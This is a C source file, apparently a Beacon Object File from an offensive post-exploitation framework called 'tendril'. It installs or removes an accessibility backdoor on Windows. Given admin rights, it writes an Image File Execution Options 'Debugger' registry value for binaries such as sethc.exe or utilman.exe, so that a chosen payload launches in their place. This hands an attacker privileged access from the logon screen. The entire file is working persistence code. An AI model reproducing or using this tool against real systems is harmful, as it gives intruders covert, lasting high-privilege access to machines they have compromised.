/*
 * tendril-accessibility-backdoor BOF
 * IFEO debugger on accessibility binaries (sethc, utilman, etc.)
 *
 * Arguments (packed):
 *   wstr targetExe - e.g. L"sethc.exe" or L"utilman.exe"
 *   wstr payload   - debugger payload path
 *   short action   - 0 = install, 1 = remove
 */
#include "tendril.h"

#define IFEO_BASE L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

void go(char* args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);

	int tLen, pLen;
	wchar_t* targetExe = (wchar_t*)BeaconDataExtract(&parser, &tLen);
	wchar_t* payload = (wchar_t*)BeaconDataExtract(&parser, &pLen);
	short action = BeaconDataShort(&parser);

	wchar_t keyPath[512];
	KERNEL32$lstrcpyW(keyPath, IFEO_BASE);
	KERNEL32$lstrcatW(keyPath, targetExe);

	if (action == 0) /* install */
	{
		LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, keyPath, L"Debugger", payload);
		if (s == ERROR_SUCCESS)
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Accessibility backdoor: %ls -> %ls", targetExe, payload);
		else
			BeaconPrintf(CALLBACK_ERROR, "[-] Failed (admin?): %d", s);
	}
	else /* remove */
	{
		tendril_reg_delete_value(HKEY_LOCAL_MACHINE, keyPath, L"Debugger");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Accessibility backdoor removed from %ls", targetExe);
	}
}
